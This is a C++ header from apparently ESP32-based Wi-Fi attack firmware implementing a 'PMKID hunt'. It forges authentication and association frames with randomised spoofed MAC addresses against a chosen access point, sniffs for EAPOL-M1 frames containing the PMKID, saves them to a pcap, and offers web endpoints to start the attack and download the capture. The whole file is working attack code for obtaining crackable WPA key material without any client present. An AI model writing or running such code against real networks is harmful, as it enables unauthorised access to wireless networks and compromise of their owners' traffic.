#pragma once
#include <WiFi.h>
#include <LittleFS.h>
#include <esp_wifi.h>
#include "frames.h"
#include "capture.h"
#include "module.h"

// PMKID hunt: send auth+assoc to target AP, capture EAPOL-M1 containing PMKID
// No victim client required — the AP itself reveals the PMKID in response to association
void aegisSniff(void *, wifi_promiscuous_pkt_type_t);

static bool ph_running = false;
static uint8_t ph_bssid[6] = {0};
static uint8_t ph_ch = 6;
static uint8_t ph_sta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
static volatile bool ph_got_pmkid = false;
static volatile uint32_t ph_eapol_m1 = 0;
static uint32_t ph_probes = 0;
static TaskHandle_t ph_task = nullptr;

static void ph_sniff(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA)
    return;
  const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *pl = p->payload;
  int len = p->rx_ctrl.sig_len;
  pcapWrite(pl, len);
  if ((pl[0] & 0x0C) != 0x08)
    return;  // only data frames
  int off = 24;
  if ((pl[1] & 0x03) == 0x03)
    off += 6;
  if (((pl[0] & 0xF0) >> 4) >= 8)
    off += 2;
  if (off + 11 > len)
    return;
  if (pl[off] != 0xAA || pl[off + 1] != 0xAA || pl[off + 6] != 0x88 || pl[off + 7] != 0x8E)
    return;
  ph_eapol_m1++;
  // Check EAPOL-Key M1: type=3, key descriptor, key info bit 3 (Install) clear, bit 7 (Ack) set
  if (pl[off + 8] == 1 && pl[off + 9] == 3) {
    uint16_t keyinfo = ((uint16_t)pl[off + 13] << 8) | pl[off + 14];
    if ((keyinfo & 0x0088) == 0x0088)
      ph_got_pmkid = true;  // ACK set, MIC clear = M1
  }
}

static void ph_run(void *) {
  uint8_t f[128];
  ph_probes = 0;
  while (ph_running) {
    // Rotate our fake STA MAC each cycle
    for (int k = 0; k < 6; k++)
      ph_sta[k] = esp_random() & 0xFF;
    ph_sta[0] = (ph_sta[0] & 0xFC) | 0x02;
    // Auth request
    size_t n = f_auth(f, ph_sta, ph_bssid);
    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    vTaskDelay(pdMS_TO_TICKS(50));
    // Assoc request (RSN IE to trigger EAPOL-M1)
    n = f_assoc(f, ph_sta, ph_bssid, "");
    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    ph_probes++;
    vTaskDelay(pdMS_TO_TICKS(500));
  }
  ph_task = nullptr;
  vTaskDelete(nullptr);
}

static bool ph_start(const String &q) {
  int i;
  String bs, ch;
  if ((i = q.indexOf("bssid=")) >= 0) {
    int e = q.indexOf('&', i);
    bs = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if (bs.length() != 17)
    return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&ph_bssid[0], (unsigned *)&ph_bssid[1],
         (unsigned *)&ph_bssid[2], (unsigned *)&ph_bssid[3], (unsigned *)&ph_bssid[4],
         (unsigned *)&ph_bssid[5]);
  ph_ch = ch.toInt();
  if (!ph_ch)
    ph_ch = 6;
  esp_wifi_set_channel(ph_ch, WIFI_SECOND_CHAN_NONE);
  pcapOpen("pmkid");
  wifi_promiscuous_filter_t flt = {};
  flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&flt);
  esp_wifi_set_promiscuous_rx_cb(ph_sniff);
  esp_wifi_set_promiscuous(true);
  ph_running = true;
  ph_got_pmkid = false;
  ph_eapol_m1 = 0;
  ph_probes = 0;
  xTaskCreate(ph_run, "ph_run", 4096, nullptr, 4, &ph_task);
  return true;
}

static void ph_stop() {
  ph_running = false;
  pcapClose();
  esp_wifi_set_promiscuous_rx_cb(aegisSniff);
  wifi_promiscuous_filter_t flt = {};
  flt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&flt);
  esp_wifi_set_promiscuous(true);
}

static void ph_routes() {
  extern WebServer server;
  server.on("/api/pmkid/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("pmkid", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/pmkid/stop", HTTP_POST, []() {
    tool_stop("pmkid");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/pmkid/status", HTTP_GET, []() {
    server.send(
        200, "application/json",
        "{\"running\":" + String(ph_running ? 1 : 0) + ",\"probes\":" + String(ph_probes) +
            ",\"m1\":" + String(ph_eapol_m1) + ",\"pmkid\":" + String(ph_got_pmkid ? 1 : 0) +
            ",\"bytes\":" + String(g_pcapBytes) + ",\"msg\":\"" +
            String(ph_got_pmkid ? "PMKID captured!" : "probes: ") + String(ph_probes) + "\"}");
  });
  server.on("/api/pmkid/pcap", HTTP_GET, []() {
    if (!g_pcapName[0] || !LittleFS.exists(g_pcapName)) {
      server.send(404, "application/json", "{\"ok\":0,\"err\":\"no capture\"}");
      return;
    }
    File f = LittleFS.open(g_pcapName, "r");
    if (!f) {
      server.send(500, "application/json", "{\"ok\":0}");
      return;
    }
    server.sendHeader("Content-Disposition", "attachment; filename=pmkid.pcap");
    server.streamFile(f, "application/octet-stream");
    f.close();
  });
}
